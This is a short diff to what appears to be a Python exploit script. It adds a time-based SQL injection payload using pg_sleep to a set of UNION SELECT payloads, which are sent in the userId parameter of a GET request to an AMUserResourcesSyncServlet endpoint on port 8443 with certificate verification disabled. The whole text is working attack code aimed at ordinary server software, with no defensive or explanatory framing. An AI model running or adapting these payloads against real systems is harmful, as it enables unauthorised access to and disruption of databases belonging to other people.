@@ -14,6 +14,7 @@ def main():
 	sqli = ";"
 	sqli = "+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END"
 	sqli = "+UNION+SELECT+1"
+	sqli = ";select+pg_sleep(10);"
 
 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
 					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
